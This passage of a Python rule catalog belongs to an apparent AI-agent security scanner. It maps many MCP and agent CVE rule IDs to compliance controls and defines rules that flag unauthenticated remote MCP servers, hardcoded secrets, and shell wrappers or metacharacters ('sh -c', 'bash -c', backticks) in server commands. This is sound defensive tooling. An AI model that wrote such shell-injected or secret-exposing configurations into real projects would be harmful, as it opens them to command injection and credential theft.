from __future__ import annotations

from dataclasses import dataclass, field

from agent_audit_kit.models import Category, Severity


@dataclass
class RuleDefinition:
    rule_id: str
    title: str
    description: str
    severity: Severity
    category: Category
    remediation: str
    sarif_name: str = ""
    cve_references: list[str] = field(default_factory=list)
    owasp_mcp_references: list[str] = field(default_factory=list)
    owasp_agentic_references: list[str] = field(default_factory=list)
    adversa_references: list[str] = field(default_factory=list)
    auto_fixable: bool = False
    # v0.3.2 — SCHEMA_VERSION 2
    incident_references: list[str] = field(default_factory=list)
    aicm_references: list[str] = field(default_factory=list)
    # v0.3.85 — OWASP Agentic Skills Top 10 (AST01-AST10). Defaults empty, so
    # every existing rule definition is unchanged.
    owasp_ast_references: list[str] = field(default_factory=list)
    # v0.3.73 — honest scope note. What the rule provably does NOT catch, in
    # plain language. Used by the AAK-AGENT-TRUST-* pre-screen rules to state
    # that single-artifact scanning does not detect intent split across multiple
    # individually-benign skills. Empty when the rule has no material blind spot
    # worth flagging.
    limitations: str = ""


RULES: dict[str, RuleDefinition] = {}


# ---------------------------------------------------------------------------
# AICM tag overlay
#
# The CSA AI Controls Matrix (AICM, v1.0 July 2025) defines 243 controls
# across 18 domains. We tag the most obvious ten AAK rules so the
# `--compliance aicm` report + CSV surface has something to group on out
# of the box. Every entry here is applied after each rule is registered
# via `_r(...)` — see `_apply_aicm_overlay()` at the bottom of this file.
#
# TODO(csa-mcp-baseline): CSA's "MCP Security Baseline v0.1" RC is "coming
# soon" per their MCP Security Resource Center announcement
# (https://cloudsecurityalliance.org/blog/2025/08/20/securing-the-agentic-ai-control-plane-announcing-the-mcp-security-resource-center).
# When the RC1 URL drops, add a `csa_mcp_baseline_references` field to
# RuleDefinition and tag the AAK-MCP-* / AAK-A2A-* / AAK-STDIO-* rules.
# scripts/watch_csa_mcp_baseline.py polls for the drop and opens a
# tracking issue automatically.
# ---------------------------------------------------------------------------

_AICM_TAGS: dict[str, list[str]] = {
    # ---- Secrets Management (DSP-17) -----------------------------------
    "AAK-SECRET-001": ["DSP-17"],
    "AAK-SECRET-002": ["DSP-17"],
    "AAK-SECRET-003": ["DSP-17"],
    "AAK-SECRET-004": ["DSP-17"],
    "AAK-SECRET-005": ["DSP-17"],
    "AAK-SECRET-006": ["DSP-17"],
    "AAK-SECRET-007": ["DSP-17"],
    "AAK-SECRET-008": ["DSP-17"],
    "AAK-SECRET-009": ["DSP-17"],
    # ---- Identity & Access Management ----------------------------------
    "AAK-TRUST-001": ["IAM-16"],
    "AAK-TRUST-002": ["IAM-16"],
    "AAK-TRUST-003": ["IAM-02"],
    "AAK-TRUST-004": ["IAM-02"],
    "AAK-TRUST-005": ["IAM-16"],
    "AAK-TRUST-006": ["IAM-16"],
    "AAK-TRUST-007": ["IAM-02"],
    "AAK-OAUTH-001": ["IAM-01", "IAM-16"],
    "AAK-OAUTH-002": ["IAM-01"],
    "AAK-OAUTH-003": ["IAM-01"],
    "AAK-OAUTH-004": ["IAM-01"],
    "AAK-OAUTH-005": ["IAM-01"],
    "AAK-OAUTH-SCOPE-001": ["IAM-16"],
    "AAK-OAUTH-3P-001": ["STA-08"],
    # ---- Supply Chain Management ---------------------------------------
    "AAK-SUPPLY-001": ["STA-02"],
    "AAK-SUPPLY-002": ["STA-08"],
    "AAK-SUPPLY-003": ["STA-02"],
    "AAK-SUPPLY-004": ["STA-02"],
    "AAK-SUPPLY-005": ["STA-08"],
    "AAK-SUPPLY-006": ["STA-08"],
    "AAK-DNS-REBIND-001": ["IVS-04", "CEK-08"],
    "AAK-DNS-REBIND-002": ["STA-02", "STA-08"],
    "AAK-SPLUNK-TOKLOG-001": ["DSP-17", "LOG-06"],
    "AAK-GHA-IMMUTABLE-001": ["STA-02", "CCC-08"],
    "AAK-EXCEL-MCP-001": ["AIS-07", "IVS-04"],
    "AAK-ASTROMCP-SQLI-CVE-2026-7591-001": ["AIS-07", "DSP-04", "IVS-09"],
    "AAK-LITELLM-CVE-2026-30623-PIN-001": ["STA-08", "AIS-08"],
    "AAK-CHATGPT-MCP-CVE-2026-7061-PIN-001": ["AIS-08", "IAM-05", "STA-08"],
    "AAK-DOCSGPT-MCP-STDIO-MITM-001": ["AIS-08", "IAM-05", "STA-08", "IVS-04"],
    "AAK-GPTRESEARCHER-MCP-STDIO-MITM-001": ["AIS-08", "IAM-05", "STA-08", "IVS-04"],
    "AAK-CLAUDECODE-CVE-2026-40068-PIN-001": ["IAM-02", "IAM-16", "STA-08"],
    "AAK-SK-INMEMORY-VECTORSTORE-FILTER-CVE-2026-26030-PIN-001": ["AIS-08", "STA-08", "IVS-04"],
    "AAK-MCPCALC-CVE-2026-44717-PIN-001": ["AIS-08", "STA-08", "IVS-04"],
    "AAK-MCP-STDIO-UNBOUNDED-BUFFER-001": ["STA-08", "IVS-04", "BCR-01"],
    "AAK-MCP-TOOL-UNSAFE-EVAL-001": ["AIS-08", "IVS-04"],
    "AAK-MCP-TOOL-ARG-OSCMD-001": ["AIS-08", "IVS-04"],
    "AAK-METIS-REFUSAL-REFEED-001": ["AIS-07", "AIS-12"],
    "AAK-MCP-LINEAGE-STAINLESS-001": ["STA-02", "STA-08"],
    "AAK-SKILL-LIFECYCLE-ATTRIBUTION-001": ["LOG-06", "AIS-12"],
    "AAK-AGENT-HARNESS-SHARED-STATE-001": ["AIS-04", "IAM-05"],
    "AAK-METIS-SCORING-SINK-001": ["AIS-07", "AIS-12"],
    "AAK-MCP-OPENAPI-LAZY-DESCRIPTION-001": ["AIS-07"],
    "AAK-MCP-OPENAPI-BLOATED-PARAMS-001": ["AIS-07"],
    "AAK-MCP-OPENAPI-TANGLED-METHODS-001": ["AIS-07"],
    "AAK-NEXT-AI-DRAW-001": ["LOG-13"],
    "AAK-LANGCHAIN-SSRF-REDIR-001": ["IVS-04", "AIS-08"],
    "AAK-SSRF-TOCTOU-001": ["IVS-04", "AIS-08"],
    "AAK-AZURE-MCP-001": ["IAM-01", "IAM-16"],
    "AAK-TOXICFLOW-001": ["AIS-12", "CCC-08"],
    "AAK-MCP-STDIO-CMD-INJ-001": ["AIS-08", "IAM-05"],
    "AAK-MCP-STDIO-CMD-INJ-002": ["AIS-08", "IAM-05"],
    "AAK-MCP-STDIO-CMD-INJ-003": ["AIS-08", "IAM-05"],
    "AAK-MCP-STDIO-CMD-INJ-004": ["AIS-08", "IAM-05"],
    "AAK-MCP-MARKETPLACE-CONFIG-FETCH-001": ["AIS-08", "STA-02"],
    "AAK-PRTITLE-IPI-001": ["AIS-07", "AIS-12"],
    "AAK-MCP-FHI-001": ["AIS-12", "CCC-08"],
    "AAK-MCP-ATLASSIAN-CVE-2026-27825-001": ["AIS-07", "STA-02"],
    "AAK-MCP-ATLASSIAN-CVE-2026-27826-001": ["AIS-07", "STA-02"],
    "AAK-IPI-WILD-CORPUS-001": ["AIS-07", "DSP-17"],
    "AAK-MCP-INSPECTOR-CVE-2026-23744-001": ["STA-02", "STA-08"],
    "AAK-MCP-SAMPLING-001": ["IAM-01", "AIS-07"],
    # ---- v0.3.25 (2026-05-25): 2026-07-28 stateless-MCP migration -----
    "AAK-MCP-STATELESS-001": ["IAM-01", "AIS-08"],
    "AAK-MCP-STATELESS-002": ["AIS-07", "AIS-08"],
    "AAK-MCP-STATELESS-003": ["IVS-04", "BCR-04"],
    "AAK-MCP-STATELESS-004": ["AIS-07"],
    "AAK-MCP-DEPRECATED-001": ["AIS-08"],
    "AAK-MCP-DEPRECATED-002": ["AIS-07", "AIS-08"],
    "AAK-MCP-DEPRECATED-003": ["AIS-08", "LOG-06"],
    # ---- 2026-07-28 spec-ahead pack (SEP-2243 / SEP-1865 / SEP-2663) ----
    "AAK-MCP-ROUTING-DESYNC-001": ["IAM-01", "AIS-07"],
    "AAK-MCP-APPS-001": ["AIS-08", "IVS-04"],
    "AAK-MCP-APPS-002": ["AIS-07", "AIS-08"],
    "AAK-TASKS-004": ["BCR-04", "AIS-08"],
    "AAK-OAUTH-006": ["IAM-01", "IAM-16"],
    "AAK-OAUTH-007": ["IAM-01", "IAM-16"],
    "AAK-OAUTH-008": ["IAM-01", "IAM-16"],
    "AAK-AZURE-MCP-NOAUTH-001": ["IAM-01", "IAM-16"],
    "AAK-MCP-AUTH-PATHTRAVERSAL-001": ["IAM-01", "IVS-04"],
    "AAK-MCP-KONG-CVE-2026-13341-001": ["AIS-07", "AIS-12"],
    "AAK-MCP-GATEWAY-REGISTRY-CVE-2026-14471-001": ["AIS-07", "DSP-07"],
    "AAK-MCP-SSRF-001": ["IVS-04", "AIS-08"],
    "AAK-MCP-SERENA-CVE-2026-49471-001": ["IAM-01", "IAM-16"],
    "AAK-MCP-LITELLM-CVE-2026-59822-001": ["IAM-01", "STA-08"],
    "AAK-MCP-CLINE-CVE-2026-59723-001": ["IAM-01", "STA-08"],
    "AAK-MCP-TEXTEDITOR-CVE-2026-15138-001": ["AIS-07", "STA-08"],
    "AAK-MCP-N8N-CVE-2026-59207-001": ["IVS-04", "STA-08"],
    "AAK-MCP-RUFLO-CVE-2026-59726-001": ["IAM-01", "STA-08"],
    "AAK-MCP-DEEPSEEK-CVE-2026-55604-001": ["IAM-01", "STA-08"],
    "AAK-MCP-K8S-CVE-2026-61459-001": ["AIS-07", "IVS-09", "STA-08"],
    "AAK-MCP-ASTRBOT-CVE-2026-15501-001": ["IVS-04", "STA-08"],
    "AAK-MCP-HEALTHLAKE-CVE-2026-15643-001": ["IVS-04", "STA-08"],
    "AAK-MCP-PRAISONAI-CVE-2026-61427-001": ["IAM-01", "STA-08"],
    "AAK-MCP-QWED-CVE-2026-55546-001": ["AIS-08", "IVS-04", "STA-08"],
    "AAK-MCP-NEXTCLOUD-CVE-2026-55640-001": ["IAM-01", "STA-08"],
    "AAK-MCP-BROWSEMCP-CVE-2026-55557-001": ["IVS-04", "STA-08"],
    "AAK-MCP-GENIEACS-CVE-2026-55637-001": ["IAM-01", "STA-08"],
    "AAK-MCP-SUBLINEAR-CVE-2026-55609-001": ["IVS-04", "STA-08"],
    "AAK-MCP-APPIUM-CVE-2026-58500-001": ["AIS-07", "STA-08"],
    "AAK-MCP-PENPOT-CVE-2026-45805-001": ["IAM-01", "AIS-07", "STA-08"],
    "AAK-MCP-OPENCLAW-CVE-2026-62195-001": ["IAM-01", "STA-08"],
    "AAK-MCP-REPOMIX-CVE-2026-49988-001": ["DSP-17", "STA-08"],
    "AAK-MCP-BETTERAUTH-CVE-2026-53512-001": ["IAM-01", "IAM-16", "STA-08"],
    "AAK-MCP-SDK-CVE-2026-52869-001": ["IAM-01", "AIS-08", "BCR-01"],
    "AAK-MCP-9ROUTER-CVE-2026-46339-001": ["IAM-01", "AIS-07", "STA-08"],
    "AAK-MCP-N8NMCP-CVE-2026-54052-001": ["IAM-01", "DSP-07", "STA-08"],
    "AAK-MCP-DBTMCP-CVE-2026-44968-001": ["AIS-07", "DSP-17", "STA-08"],
    "AAK-MCP-APIFY-CVE-2026-46341-001": ["IVS-04", "STA-08"],
    "AAK-MCP-AGENTICFLOW-CVE-2026-58195-001": ["AIS-07", "STA-08"],
    "AAK-MCP-HEALTHOMICS-CVE-2026-15415-001": ["IVS-04", "STA-08"],
    "AAK-MCP-WHATSAPP-CVE-2026-46555-001": ["IAM-01", "IVS-04", "STA-08"],
    "AAK-MCP-AGENTICMAIL-CVE-2026-57495-001": ["AIS-07", "AIS-12", "STA-08"],
    "AAK-MCP-STATA-CVE-2026-47708-001": ["AIS-08", "IAM-05", "STA-08"],
    "AAK-MCP-N8N-CVE-2026-65594-001": ["IAM-01", "IAM-16", "STA-08"],
    "AAK-MCP-MCPHUB-CVE-2026-79748-001": ["IAM-01", "IVS-04", "STA-08"],
    "AAK-MCP-SEQTHINKING-CVE-2026-81845-001": ["AIS-08", "STA-08"],
    "AAK-MCP-AWSAPIMCP-CVE-2026-16584-001": ["IAM-01", "AIS-07", "STA-08"],
    "AAK-MCP-AMAZONMQ-CVE-2026-18655-001": ["DSP-17", "STA-08", "IVS-04"],
    "AAK-MCP-LANGGRAPH-MONGO-CVE-2026-48121-001": ["STA-08", "AIS-07", "DSP-04"],
    "AAK-MCP-DOCUMENTDB-CVE-2026-18954-001": ["STA-08", "IAM-01", "DSP-04"],
    "AAK-MCP-FRONTMCP-CVE-2026-67531-001": ["STA-08", "AIS-07", "IVS-04"],
    "AAK-MCP-LANGGRAPH-CHECKPOINT-CVE-2026-71433-001": ["STA-08", "AIS-07", "DSP-04"],
    "AAK-METAADS-CVE-2026-48039-001": ["DSP-17", "IAM-01", "STA-08"],
    "AAK-MCP-GOOGLESEARCH-CVE-2026-19337-001": ["IVS-04", "STA-08"],
    "AAK-MCP-FLORENCE2-CVE-2026-19984-001": ["IVS-04", "STA-08"],
    "AAK-MCP-CODEWHALE-CVE-2026-75858-001": ["IVS-04", "STA-08"],
    "AAK-MCP-MARIMO-CVE-2026-75149-001": ["IVS-04", "STA-08"],
    "AAK-MCP-OMNIGENT-CVE-2026-62674-001": ["IVS-04", "IAM-01"],
    "AAK-MCP-NEOMJS-CVE-2026-18482-001": ["IVS-04", "STA-08"],
    "AAK-MCP-LANGBOT-CVE-2026-54449-001": ["IVS-04", "IAM-01"],
    "AAK-MCP-REMOTE-CVE-2026-51994-001": ["IVS-04", "STA-08"],
    "AAK-MCP-KIMICODE-CVE-2026-95660-001": ["IAM-01", "STA-08"],
    "AAK-MCP-PILLMWIKI-CVE-2026-102911-001": ["IVS-04", "STA-08"],
    "AAK-MCP-FASTMCPTELEGRAM-CVE-2026-55096-001": ["IVS-04", "STA-08"],
    "AAK-MCP-OBOT-CVE-2026-101084-001": ["IAM-01", "IVS-04", "STA-08"],
    "AAK-MCP-OBOT-CVE-2026-105138-001": ["IAM-01", "STA-08"],
    "AAK-MCP-METAMCP-CVE-2026-79538-001": ["IAM-01", "IVS-04", "STA-08"],
    "AAK-MCP-HEYM-CVE-2026-100858-001": ["IVS-04", "STA-08"],
    "AAK-MCP-OFFICEPPT-CVE-2025-71427-001": ["AIS-07", "STA-08"],
    "AAK-MCP-PENPOT-CVE-2026-100868-001": ["IAM-01", "IVS-04", "STA-08"],
    "AAK-MCP-VOICEMODE-CVE-2026-79535-001": ["IVS-04", "STA-08"],
    "AAK-MCP-SHARIQ-GITHUB-CVE-2026-102906-001": ["IVS-04", "STA-08"],
    "AAK-MCP-MARK3LABS-FS-CVE-2026-79534-001": ["AIS-07", "STA-08"],
    "AAK-MCP-OPENCLAW-CVE-2026-102807-001": ["IAM-01", "STA-08"],
    "AAK-MCP-ZSCALER-CVE-2026-59563-001": ["IAM-01", "STA-08"],
    "AAK-MCP-UTCP-CVE-2026-101057-001": ["CEK-08", "STA-08"],
    "AAK-MCP-TOOLBOX-CVE-2026-102242-001": ["AIS-07", "STA-08"],
    "AAK-MCP-NEXTJS-CVE-2026-94486-001": ["IVS-04", "STA-08"],
    "AAK-MCP-CLAUDECODE-CVE-2026-103012-001": ["IAM-02", "IAM-16", "STA-08"],
    "AAK-MCP-LANGGRAPHSDK-CVE-2026-104873-001": ["IAM-01", "STA-08"],
    "AAK-MCP-DIFY-CVE-2026-105761-001": ["IAM-01", "STA-08"],
    "AAK-MCP-K6-CVE-2026-89039-001": ["AIS-07", "STA-08"],
    "AAK-MCP-TSSDK-CVE-2026-104850-001": ["IAM-01", "IAM-16", "STA-08"],
    "AAK-MCP-PAYLOAD-CVE-2026-105806-001": ["IAM-01", "STA-08"],
    "AAK-MCP-LANGCHAIN-REDIS-CVE-2026-105799-001": ["STA-08", "AIS-07", "DSP-04"],
    "AAK-MCP-LANGCHAIN-MONGO-CVE-2026-106119-001": ["STA-08", "AIS-07", "DSP-04"],
    "AAK-MCP-ARGOCD-CVE-2026-108585-001": ["AIS-07", "STA-08"],
    "AAK-MCP-1MCP-CVE-2026-108586-001": ["IAM-01", "STA-08"],
    "AAK-MCP-KORTIX-CVE-2026-108115-001": ["IVS-04", "STA-08"],
    "AAK-MCP-UNLA-CVE-2026-108865-001": ["IAM-01", "STA-08"],
    "AAK-MCP-KOTLINSDK-CVE-2026-108714-001": ["STA-08", "IVS-04", "BCR-01"],
    "AAK-MCP-ELVIX-CVE-2026-108542-001": ["IVS-04", "STA-08"],
    "AAK-MCP-TRINITY-CVE-2026-108756-001": ["IAM-01", "STA-08"],
    "AAK-MCP-OBSIDIANTC-CVE-2026-77366-001": ["IAM-01", "IVS-04", "STA-08"],
    "AAK-MCP-NGINXUI-CVE-2026-84317-001": ["AIS-07", "IAM-01", "STA-08"],
    "AAK-MCP-EDGEEVER-CVE-2026-109557-001": ["AIS-07", "STA-08"],
    "AAK-MCP-NULLHUB-CVE-2026-110616-001": ["IAM-01", "IVS-04", "STA-08"],
    "AAK-MCP-JUNIE-CVE-2026-111091-001": ["IAM-16", "STA-08"],
    "AAK-MCP-JAVASDK-CVE-2026-108395-001": ["STA-08", "IVS-04", "BCR-01"],
    "AAK-MCP-SDK-CVE-2026-59951-001": ["STA-08", "IVS-04", "BCR-01"],
    "AAK-MCP-NETWORKAI-CVE-2026-109331-001": ["IAM-05", "STA-08"],
    "AAK-MCP-CONDUCTOR-CVE-2026-109402-001": ["IVS-04", "STA-08"],
    "AAK-MCP-REMOTE-CVE-2026-108716-001": ["CEK-08", "IVS-04", "STA-08"],
    "AAK-MCP-GRAFANA-CVE-2026-19516-001": ["IVS-04", "STA-08"],
    "AAK-MCP-N8N-CVE-2026-72768-001": ["IVS-04", "STA-08"],
    "AAK-MCP-CCTEMPLATES-CVE-2026-73222-001": ["IAM-01", "STA-08"],
    "AAK-IDE-TASK-001": ["STA-08", "IVS-04"],
    "AAK-IDE-TASK-002": ["STA-08", "IVS-04"],
    "AAK-IDE-TASK-003": ["STA-08", "IVS-04"],
    "AAK-IDE-TASK-004": ["STA-08"],
    "AAK-AGENT-TRUST-001": ["AIS-08", "IVS-04", "STA-08"],
    "AAK-AGENT-TRUST-002": ["AIS-08", "IVS-04", "IAM-05"],
    "AAK-AGENT-TRUST-003": ["IAM-05", "STA-08"],
    "AAK-AGENT-TRUST-004": ["AIS-08", "STA-08"],
    "AAK-AGENT-COMPOSE-001": ["IVS-04", "AIS-08", "STA-08"],
    "AAK-AGENT-COMPOSE-002": ["IVS-04", "AIS-08", "STA-08"],
    "AAK-MCP-FLYTO-CVE-2026-67425-001": ["DSP-17", "STA-08", "IVS-04"],
    "AAK-MCP-LANGFLOW-CVE-2026-12940-001": ["STA-08", "AIS-07", "IVS-04"],
    "AAK-MCP-AWSSECAGENT-CVE-2026-87913-001": ["STA-08", "DSP-10", "IVS-04"],
    "AAK-MCP-MYSQLMCP-CVE-2026-59971-001": ["IAM-01", "IVS-04", "STA-08"],
    "AAK-MCP-PRAISONAI-TS-CVE-2026-57139-001": ["IAM-01", "IVS-04", "STA-08"],
    "AAK-MCP-GITLAB-ZEREIGHT-CVE-2026-61560-001": ["IAM-01", "DSP-17", "STA-08"],
    "AAK-MCP-FLOWISE-CVE-2026-91931-001": ["IVS-04", "STA-08"],
    "AAK-MCP-FROMOPENAPI-CVE-2026-59973-001": ["IVS-04", "STA-08"],
    "AAK-MCP-CONTENTFUL-CVE-2026-53957-001": ["DSP-17", "IVS-04", "STA-08"],
    "AAK-MCP-SEARXNG-CVE-2026-58483-001": ["IVS-04", "STA-08"],
    "AAK-MCP-ATOMICAGENTS-CVE-2026-91988-001": ["IVS-04", "CEK-08", "STA-08"],
    "AAK-MCP-NETLICENSING-CVE-2026-54446-001": ["IAM-01", "IVS-04", "STA-08"],
    "AAK-MCP-GEMINIBRIDGE-CVE-2026-54785-001": ["AIS-07", "STA-08"],
    "AAK-LMDEPLOY-VL-SSRF-001": ["IVS-04", "AIS-08"],
    "AAK-SPLUNK-MCP-TOKEN-LEAK-001": ["DSP-17", "LOG-06"],
    "AAK-MARKETPLACE-001": ["STA-10"],
    "AAK-MARKETPLACE-002": ["STA-10"],
    "AAK-MARKETPLACE-003": ["STA-10"],
    "AAK-MARKETPLACE-004": ["STA-10"],
    "AAK-SKILL-001": ["STA-10"],
    "AAK-SKILL-002": ["STA-10"],
    "AAK-SKILL-003": ["STA-10"],
    "AAK-SKILL-004": ["STA-10"],
    "AAK-SKILL-005": ["STA-10"],
    # ---- Transport / Crypto --------------------------------------------
    "AAK-MCP-017": ["CEK-08"],
    "AAK-TRANSPORT-001": ["CEK-08"],
    "AAK-TRANSPORT-002": ["CEK-08"],
    "AAK-TRANSPORT-003": ["CEK-08"],
    "AAK-TRANSPORT-004": ["CEK-08"],
    # ---- Input validation / tool injection (AIS-07) --------------------
    "AAK-TAINT-001": ["AIS-07"],
    "AAK-TAINT-002": ["AIS-07"],
    "AAK-TAINT-003": ["AIS-07"],
    "AAK-TAINT-004": ["AIS-07"],
    "AAK-TAINT-005": ["AIS-07"],
    "AAK-TAINT-006": ["AIS-07"],
    "AAK-TAINT-007": ["AIS-07"],
    "AAK-TAINT-008": ["AIS-07"],
    "AAK-POISON-001": ["AIS-07"],
    "AAK-POISON-002": ["AIS-07"],
    "AAK-POISON-003": ["AIS-07"],
    "AAK-POISON-004": ["AIS-07"],
    "AAK-POISON-005": ["AIS-07"],
    "AAK-POISON-006": ["AIS-07"],
    "AAK-SSRF-001": ["IVS-04"],
    "AAK-SSRF-002": ["IVS-04"],
    "AAK-SSRF-003": ["IVS-04"],
    "AAK-SSRF-004": ["IVS-04"],
    "AAK-SSRF-005": ["IVS-04"],
    # ---- A2A protocol (IAM + STA) --------------------------------------
    "AAK-A2A-001": ["IAM-04"],
    "AAK-A2A-002": ["IAM-01"],
    "AAK-A2A-003": ["AIS-07"],
    "AAK-A2A-004": ["CEK-08"],
    "AAK-A2A-005": ["IAM-01"],
    "AAK-A2A-006": ["IAM-01"],
    "AAK-A2A-007": ["IAM-04"],
    "AAK-A2A-008": ["IAM-01"],
    "AAK-A2A-009": ["IAM-04"],
    "AAK-A2A-010": ["IAM-04"],
    "AAK-A2A-011": ["IAM-01"],
    "AAK-A2A-012": ["AIS-07"],
    # ---- Hook / Agent / Routine (IAM + change control) -----------------
    "AAK-HOOK-001": ["CCC-08"],
    "AAK-HOOK-002": ["CCC-08"],
    "AAK-HOOK-003": ["CCC-08"],
    "AAK-HOOK-004": ["IAM-01"],
    "AAK-HOOK-005": ["IAM-01"],
    "AAK-HOOK-006": ["CCC-08"],
    "AAK-HOOK-007": ["CCC-08"],
    "AAK-AGENT-001": ["IAM-02"],
    "AAK-AGENT-002": ["IAM-02"],
    "AAK-AGENT-006": ["IAM-02"],
    "AAK-ROUTINE-001": ["IAM-02"],
    # ---- Logging (LOG) -------------------------------------------------
    "AAK-LOGINJ-001": ["LOG-06"],
    # ---- MCPwn / SDK hardening / CVE-response coverage -----------------
    "AAK-MCPWN-001": ["IAM-01"],
    "AAK-MCPFRAME-001": ["LOG-13"],
    "AAK-DORIS-001": ["AIS-07", "DSP-07"],
    "AAK-ANTHROPIC-SDK-001": ["AIS-07", "STA-08"],
    "AAK-FLOWISE-001": ["STA-08"],
    "AAK-STDIO-001": ["AIS-07"],
    "AAK-WINDSURF-001": ["AIS-07"],
    "AAK-NEO4J-001": ["IAM-02"],
    "AAK-CLAUDE-WIN-001": ["CCC-08"],
    "AAK-SEC-MD-001": ["STA-10"],
    # ---- v0.3.9 (2026-04-28) --------------------------------------------
    "AAK-PROJECT-DEAL-DRIFT-001": ["AIS-07", "DSP-07"],
    "AAK-LANGGRAPH-TOOLNODE-LIST-REGRESSION-001": ["AIS-07"],
    "AAK-DEEPSEEK-V4-MOE-TOOL-INJ-001": ["AIS-07"],
    "AAK-TIKTOK-AGENT-HIJACK-001": ["IAM-02", "CCC-08"],
    "AAK-OX-COVERAGE-MANIFEST-001": ["STA-08"],
    # ---- v0.3.10 (2026-04-29) -------------------------------------------
    "AAK-CREWAI-CHAIN-2026-04-001": ["AIS-07", "STA-08"],
    "AAK-CREWAI-CVE-2026-2275-001": ["AIS-07", "IVS-04"],
    "AAK-CREWAI-CVE-2026-2285-001": ["AIS-07"],
    "AAK-CREWAI-CVE-2026-2286-001": ["IVS-04"],
    "AAK-CREWAI-CVE-2026-2287-001": ["AIS-07", "IVS-04"],
    "AAK-LANGCHAIN-PROMPT-LOADER-PATH-001": ["AIS-07"],
    "AAK-PRISMA-AIRS-COVERAGE-001": ["STA-08"],
    "AAK-OPENCLAW-PRIVESC-001": ["IAM-02"],
}


def _r(
    rule_id: str,
    title: str,
    description: str,
    severity: Severity,
    category: Category,
    remediation: str,
    sarif_name: str = "",
    cve_references: list[str] | None = None,
    owasp_mcp_references: list[str] | None = None,
    owasp_agentic_references: list[str] | None = None,
    adversa_references: list[str] | None = None,
    auto_fixable: bool = False,
    incident_references: list[str] | None = None,
    aicm_references: list[str] | None = None,
    owasp_ast_references: list[str] | None = None,
    limitations: str = "",
) -> None:
    RULES[rule_id] = RuleDefinition(
        rule_id=rule_id,
        title=title,
        description=description,
        severity=severity,
        category=category,
        remediation=remediation,
        sarif_name=sarif_name,
        cve_references=cve_references or [],
        owasp_mcp_references=owasp_mcp_references or [],
        owasp_agentic_references=owasp_agentic_references or [],
        adversa_references=adversa_references or [],
        owasp_ast_references=owasp_ast_references or [],
        auto_fixable=auto_fixable,
        incident_references=incident_references or [],
        aicm_references=aicm_references or [],
        limitations=limitations,
    )


# ---------------------------------------------------------------------------
# MCP Configuration Security (10 rules)
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-001",
    "Remote MCP server without authentication",
    "An MCP server uses HTTP transport (url field) without a recognized "
    "authentication or access-control header. Recognized schemes are "
    "Authorization / Bearer, X-API-Key / Api-Key, the custom credential-header "
    "family (X-*-Key, *-API-Key, *_API_KEY, *-Subscription-Key and similar), and "
    "the x402 X-PAYMENT gate, declared via an env/template reference (e.g. "
    "${API_KEY}). A custom auth header carrying a hardcoded literal secret still "
    "fires — the credential is exposed in the config, so the endpoint is "
    "effectively unprotected. A server on a loopback host (localhost, "
    "127.0.0.0/8, ::1, 0.0.0.0) is not reported. Unauthenticated remote servers "
    "can be MITM'd or spoofed.",
    Severity.CRITICAL,
    Category.MCP_CONFIG,
    "Add OAuth 2.1 bearer token or API key header authentication (reference the "
    "secret via an env var, do not hardcode it in the config).",
    sarif_name="RemoteMcpServerNoAuth",
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reads the `url` field of each server in `mcpServers`, or `servers` in VS "
        "Code's `.vscode/mcp.json`, and looks for an `Authorization`, `Bearer`, "
        "`X-API-Key` or `API-Key` header, or for one of a "
        "fixed family of custom credential headers (`X-*-Key`, `X-*-Token` but not "
        "`X-CSRF-Token` or `X-XSRF-Token`, `X-*-Secret`, a name ending in `-API-Key`, "
        "`_API_KEY` or `ApiKey`, `*-API-Token`, `*-Access-Key`, `*-Client-Secret`, "
        "`*-Subscription-Key`, `X-Auth-Token`, "
        "`X-Access-Token`, `X-Payment`) whose value is empty or blank, or contains a "
        "`${VAR}`, `$VAR`, `{{VAR}}`, `<VAR>` or `%VAR%` reference, your, change-me "
        "(also change_me and change me), changeme, placeholder, redacted, dummy or "
        "four x's anywhere, `_here` at the end of a word, or example or sample as a "
        "whole word (an underscore joins words, so `example_key` does not count); "
        "`\"X-Foo-Key\": \"\"` and `\"k9f2-example-77a1\"` both count as a declared "
        "scheme. A remote URL given any other way is not examined: as an argument to a "
        "bridge (`npx mcp-remote https://...`) or under another key such as "
        "`serverUrl`. A server on a loopback host (localhost, 127.0.0.0/8, ::1 or "
        "0.0.0.0) is not reported, though one that checks no `Origin` header can still "
        "be reached from a web page through DNS rebinding."
    ),
)

_r(
    "AAK-MCP-002",
    "MCP server command runs with shell expansion",
    "An MCP server command contains shell metacharacters or shell wrappers (sh -c, bash -c). "
    "This enables command injection via argument composition.",
    Severity.CRITICAL,
    Category.MCP_CONFIG,
    "Put only the program in `command` and every argument in `args`. This rule matches "
    "`sh -c`, `bash -c`, `cmd /c` and any of `|`, `;`, `&`, `$`, `(`, `)` or a backtick "
    "in `command`, so a path such as `$HOME/bin/server`, or one containing parentheses, "
    "fires it too. A VS Code variable such as `${workspaceFolder}`, which VS Code "
    "substitutes itself, does not.",
    sarif_name="McpCommandShellInjection",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-INJECT-01"],
    limitations=(
        "Looks only at the `command` string of each server in `mcpServers`, or "
        "`servers` in VS Code's `.vscode/mcp.json`, for one of the characters | ; & ` "
        "$ ( ) or a leading `sh -c`, `bash -c`, `cmd /c` or `cmd.exe /c`, after "
        "removing any VS Code variable (`${workspaceFolder}`, `${userHome}`, "
        "`${env:...}` and the others VS Code documents), which VS Code substitutes "
        "itself. The same wrapper split into `command: bash` and `args: [\"-c\", "
        "...]` is not read by this rule."
    ),
)

_r(
    "AAK-MCP-003",
    "MCP server environment exposes secrets",
    "Hardcoded secrets found in mcpServers env block. "
    "Secrets in project-scoped MCP config are committed to git.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Replace the literal value with a reference of the form `${NAME}`, set `NAME` in "
    "your shell or secrets manager, and rotate the secret if it was ever committed.",
    sarif_name="McpEnvExposesSecrets",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-TOKEN-01"],
    limitations=(
        "Reads the `env` block of each server in `mcpServers`, or `servers` in VS "
        "Code's `.vscode/mcp.json`, and flags a value that is not a bare `${VAR}` when "
        "the variable name contains KEY, SECRET, TOKEN, PASSWORD, CREDENTIAL, "
        "ANTHROPIC, OPENAI or AWS_. A literal secret in `headers` (`Authorization: "
        "Bearer ...`) or inside a connection string under another name "
        "(`DATABASE_URL=postgres://user:pass@host/db`) is not matched. A value is "
